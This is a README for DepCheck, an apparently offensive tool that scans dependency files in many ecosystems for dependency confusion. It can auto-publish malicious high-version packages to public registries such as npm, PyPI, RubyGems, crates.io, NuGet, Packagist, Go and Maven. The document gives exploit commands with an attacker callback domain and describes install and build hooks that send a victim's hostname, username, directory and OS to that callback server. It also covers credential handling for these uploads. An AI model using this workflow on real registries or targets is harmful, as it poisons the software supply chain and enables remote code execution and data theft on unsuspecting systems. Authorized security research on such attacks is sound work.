# DepCheck - Universal Dependency Confusion Scanner & Exploiter

A Python tool that handles **ALL** dependency file formats across package managers, auto-detects file type, checks for dependency confusion vulnerabilities, and **auto-exploits** them.

**No external dependencies required** — uses only Python standard library.

## Why This Tool?

### The Problem

Existing tools like `confused` only understand `package.json` format. But in the real world you encounter many different formats:

```
confused -l npm package-lock.json
# ERROR: json: cannot unmarshal object into Go struct field
#        PackageJSON.dependencies of type string
```

**Why does this error happen?**

`package.json` stores dependencies as simple strings:
```json
{ "dependencies": { "react": "^18.2.0" } }
```

`package-lock.json` stores them as nested objects:
```json
{
  "dependencies": {
    "react": {
      "version": "18.2.0",
      "resolved": "https://registry.npmjs.org/react/-/react-18.2.0.tgz",
      "integrity": "sha512-...",
      "requires": { "@babel/runtime": "^7.20.0" }
    }
  }
}
```

`confused` tries to parse the nested object as a string → **crash**.

Same problem exists for `yarn.lock` (custom text format), `requirements.txt` (plain text), `pom.xml` (XML), `Cargo.toml` (TOML), etc.

### The Solution

**DepCheck** auto-detects the file format, parses it correctly, checks every package against the public registry, and optionally auto-publishes exploit packages — all in one tool.

## Supported File Formats

| File | Ecosystem | Auto-Detect |
|------|-----------|:-----------:|
| `package.json` | npm | Yes |
| `package-lock.json` (v1/v2/v3) | npm | Yes |
| `yarn.lock` (v1/v2) | npm/Yarn | Yes |
| `pnpm-lock.yaml` (v6/v9) | pnpm | Yes |
| `requirements.txt` | pip/Python | Yes |
| `Pipfile` | pipenv | Yes |
| `Pipfile.lock` | pipenv | Yes |
| `pyproject.toml` | poetry/uv | Yes |
| `composer.json` | Composer/PHP | Yes |
| `composer.lock` | Composer/PHP | Yes |
| `Gemfile` | RubyGems | Yes |
| `Gemfile.lock` | RubyGems | Yes |
| `pom.xml` | Maven/Java | Yes |
| `build.gradle` / `.kts` | Gradle | Yes |
| `go.mod` | Go Modules | Yes |
| `Cargo.toml` | Cargo/Rust | Yes |
| `Cargo.lock` | Cargo/Rust | Yes |
| `packages.config` | NuGet/.NET | Yes |
| `.csproj` | NuGet/.NET | Yes |

## Installation

```bash
git clone https://github.com/BlackHatExploitation/depcheck.git
cd depcheck
chmod +x depcheck.py

# No pip install needed — zero dependencies!
# Works as both CLI and Web UI
```

## Usage

### Basic Scan

```bash
# Auto-detects file type and scans
python3 depcheck.py package.json
python3 depcheck.py package-lock.json
python3 depcheck.py requirements.txt
python3 depcheck.py composer.lock
python3 depcheck.py pom.xml
python3 depcheck.py go.mod
python3 depcheck.py Cargo.toml
python3 depcheck.py Gemfile
```

### Scan from URL

```bash
python3 depcheck.py --url https://target.com/package.json
python3 depcheck.py --url https://target.com/package-lock.json
```

### Scan Directory

```bash
python3 depcheck.py ./project/
# Automatically finds and scans all dependency files recursively
```

### List Packages Only

```bash
python3 depcheck.py --list package-lock.json
```

### Convert Mode

Convert any format to `package.json` for use with other tools (`confused`, etc.):

```bash
python3 depcheck.py --convert package-lock.json
# Output: package-lock.json-converted.json

# Then use with confused:
confused -l npm package-lock.json-converted.json
```

### Export Results

```bash
python3 depcheck.py --export results.json package-lock.json
```

### Custom File Names

If the file doesn't have a standard name, specify the type manually:

```bash
python3 depcheck.py --type package_lock_json custom-name.json
python3 depcheck.py --type requirements_txt deps.txt
```

### Faster Scanning

```bash
python3 depcheck.py --threads 50 package-lock.json
```

### Quiet Mode

```bash
python3 depcheck.py -q package.json
# Only prints vulnerable package names
```

## Web UI

Launch a browser-based interface — scan, view results, exploit, and manage credentials visually.

```bash
# Start web UI (default port 8443)
python3 depcheck.py --web

# Custom port
python3 depcheck.py --web --port 9090
```

Then open `http://localhost:8443` in your browser.

**Features:**
- Drag & drop file upload or paste URL
- Real-time scan progress
- Results dashboard with stats and tables
- One-click exploitation
- Credential management panel
- Scan history
- Dark hacker theme
- Zero dependencies — just Python stdlib

The web UI uses the same scanning, exploitation, and credential engine as the CLI.

## Auto-Exploitation

Automatically publish higher-version packages to public registries when vulnerabilities are found. Supports **ALL major package managers**.

### Supported Ecosystems

| Ecosystem | Method | Token | Payload Hook |
|-----------|--------|-------|-------------|
| **npm** | `npm publish` | `npm_token` | `preinstall.js` (Node.js) |
| **pip/PyPI** | `twine upload` | `pypi_token` | `setup.py` (Python) |
| **RubyGems** | `gem push` | `rubygems_token` | `extconf.rb` (runs on gem install) |
| **Cargo/crates.io** | `cargo publish` | `cargo_token` | `build.rs` (runs at compile) |
| **NuGet/.NET** | `nuget push` | `nuget_token` | `.targets` (MSBuild task) |
| **Composer/Packagist** | GitHub repo + Packagist API | `github_token` + `packagist_token` | `post-install-cmd` (PHP) |
| **Go Modules** | GitHub repo + tag | `github_token` | `init()` function (runs on import) |
| **Maven** | GitHub repo (manual deploy) | `github_token` | Static initializer (Java) |

### Usage

```bash
# npm
python3 depcheck.py --exploit --callback your.burp.net --npm-token tok package.json

# Python/PyPI
python3 depcheck.py --exploit --callback your.burp.net --pypi-token tok requirements.txt

# RubyGems
python3 depcheck.py --exploit --callback your.burp.net --rubygems-token tok Gemfile

# Cargo/Rust
python3 depcheck.py --exploit --callback your.burp.net --cargo-token tok Cargo.toml

# NuGet/.NET
python3 depcheck.py --exploit --callback your.burp.net --nuget-token tok packages.config

# Composer/PHP (creates GitHub repo + submits to Packagist)
python3 depcheck.py --exploit --callback your.burp.net --github-token ghp_xxx composer.json

# Go modules (creates GitHub repo with malicious init())
python3 depcheck.py --exploit --callback your.burp.net --github-token ghp_xxx go.mod

# Maven/Java (creates GitHub repo, manual deploy to Central)
python3 depcheck.py --exploit --callback your.burp.net --github-token ghp_xxx pom.xml
```

### Or save all creds once and just use `--exploit`:

```bash
# Save everything
python3 depcheck.py --save-creds npm_token=npm_xxx pypi_token=pypi-yyy \
  rubygems_token=rrr cargo_token=ccc nuget_token=nnn \
  github_token=ghp_xxx packagist_token=ppp \
  callback=your.burp.net author=YourName

# Now just scan + exploit any file:
python3 depcheck.py --exploit package.json
python3 depcheck.py --exploit requirements.txt
python3 depcheck.py --exploit Gemfile.lock
python3 depcheck.py --exploit Cargo.toml
python3 depcheck.py --exploit composer.json
python3 depcheck.py --exploit go.mod
python3 depcheck.py --exploit pom.xml
```

### How Each Exploit Works

**npm / pip / RubyGems / Cargo / NuGet** — Direct registry publish:
1. Creates a package with version `99.99.99`
2. Embeds callback payload in the install/build hook
3. Publishes directly to the public registry
4. Target's next `install` pulls the higher version → **RCE**

**Composer** — GitHub + Packagist:
1. Creates a GitHub repo with `composer.json` containing `post-install-cmd` callback
2. Tags version `v99.99.99`
3. Submits to Packagist via API (needs `packagist_token`)
4. Target's `composer install` pulls from Packagist → **RCE**

**Go** — GitHub repo:
1. Creates a GitHub repo with `go.mod` + `.go` file containing `init()` callback
2. Tags `v99.99.99`
3. Go proxy picks it up automatically
4. Target's `go get` / `go build` executes `init()` → **RCE**

**Maven** — GitHub repo (semi-auto):
1. Creates GitHub repo with `pom.xml` + Java class with static initializer callback
2. Prints instructions to deploy to Maven Central (requires Sonatype OSSRH + GPG)
3. Can also deploy to GitHub Packages directly

### Callback Payload

Every ecosystem's payload sends the same data:

| Field | Description |
|-------|-------------|
| `p` | Package name |
| `h` | Hostname |
| `u` | Username |
| `d` | Current directory |
| `c` | OS/platform |

Via both **DNS** lookup (sanitized subdomain) and **HTTPS/HTTP POST** to your callback server.

### Character Escaping

All strings are properly escaped for each language:
- JavaScript string literals (npm)
- Python string literals (PyPI)
- Ruby string literals (RubyGems)
- Rust string literals (Cargo)
- XML/C# (NuGet)
- PHP (Composer)
- Go (Go modules)
- Java (Maven)
- DNS labels (sanitized to alphanumeric + hyphens, max 60 chars)

## Credential Management

Save credentials once, use them every time.

```bash
# Save all tokens in one command
python3 depcheck.py --save-creds npm_token=npm_xxx pypi_token=pypi-yyy \
  rubygems_token=rrr cargo_token=ccc nuget_token=nnn \
  github_token=ghp_xxx packagist_token=ppp \
  callback=your.burp.net author=YourName

# Show saved credentials (masked)
python3 depcheck.py --show-creds

# Delete a single credential
python3 depcheck.py --delete-cred pypi_token

# Clear all credentials
python3 depcheck.py --clear-creds

# Use saved creds automatically — no flags needed
python3 depcheck.py --exploit package.json
```

Stored in `~/.depcheck/config.json` with `0600` permissions.

**Priority:** CLI flag (`--npm-token xxx`) > saved credential > error

## False Positive Elimination

DepCheck automatically filters out packages that cannot be dependency confusion targets:

| Source | Filtered |
|--------|----------|
| npm aliases (`npm:real-pkg@^1.0`) | Resolves to real package name |
| Workspace packages (`link: true`) | Skipped — local packages |
| Git/URL dependencies | Skipped across all ecosystems |
| File/path dependencies | Skipped across all ecosystems |
| PHP platform reqs (`php`, `ext-*`) | Skipped in Composer |
| Go local replacements | Skipped in go.mod |
| Cargo path/git deps | Skipped |
| Ruby `git:`/`path:` gems | Skipped |

## Example Output

### Vulnerable Project
```
============================================================
  SCAN RESULTS
============================================================
  File:       package.json
  Ecosystem:  npm
  Total:      13
  Safe:       4
  Vulnerable: 9
  Duration:   2.3s
============================================================

  [!] VULNERABLE — Not found on public registry:

  [!] acme-billing-sdk @ ^1.0.5
  [!] internal-auth-middleware @ ^3.2.1
  [!] company-logger-service @ ^1.4.0
  [!] private-api-client-xyz @ ^0.9.0

  An attacker can register these on the public npm registry
  with a higher version → Remote Code Execution!
```

### Safe Project
```
============================================================
  SCAN RESULTS
============================================================
  File:       test.json
  Ecosystem:  npm
  Total:      419
  Safe:       419
  Vulnerable: 0
  Duration:   12.1s
============================================================

  [OK] All 419 packages exist on the public npm registry.
  No dependency confusion vulnerability found.
```

## All Options

```
Scanning:
  target                File, directory, or use --url
  --url, -u             Fetch dependency file from URL
  --convert             Convert to package.json format
  --export, -e          Export results to JSON
  --list, -l            List packages only (no scan)
  --threads, -t         Concurrent threads (default: 20)
  --timeout             Request timeout in seconds (default: 10)
  --type                Override file type detection
  --quiet, -q           Only print vulnerable packages
  --web                 Start web UI (browser-based)
  --port PORT           Web UI port (default: 8443)

Exploitation:
  --exploit             Auto-exploit vulnerable packages
  --callback            Callback domain (burp collaborator, interactsh, etc.)
  --npm-token           npm access token
  --pypi-token          PyPI API token
  --rubygems-token      RubyGems API key
  --nuget-token         NuGet API key
  --cargo-token         crates.io API token
  --github-token        GitHub token (for Composer/Go/Maven)
  --author              Author name for published packages

Credentials:
  --save-creds K=V      Save credentials (multiple: K1=V1 K2=V2 ...)
  --show-creds          Show saved credentials
  --delete-cred KEY     Delete a single credential
  --clear-creds         Delete all saved credentials
```

## How It Works

```
┌─────────────┐    ┌──────────────┐    ┌─────────────────┐    ┌──────────┐
│  Input File │───→│ Auto-Detect  │───→│ Parse & Extract │───→│  Check   │
│  URL / Dir  │    │  File Type   │    │ Package Names   │    │ Registry │
└─────────────┘    └──────────────┘    └─────────────────┘    └──────────┘
                                                                    │
                   ┌──────────────┐    ┌─────────────────┐         │
                   │   Results    │←───│   Thread Pool   │←────────┘
                   │  + Exploit   │    │  (20 threads)   │
                   └──────────────┘    └─────────────────┘
```

1. **Auto-Detect**: Checks filename first, then content structure
2. **Parse**: Runs the appropriate parser for the detected format
3. **Extract**: Pulls out all package names, filters false positives
4. **Check**: Queries public registry for each package (concurrent)
5. **Report**: Shows which packages don't exist (= vulnerable)
6. **Exploit** *(optional)*: Publishes higher-version packages with callback payloads

## Disclaimer

This tool is intended for **authorized security testing**, **bug bounty programs**, and **educational purposes** only. Always obtain proper authorization before testing targets.
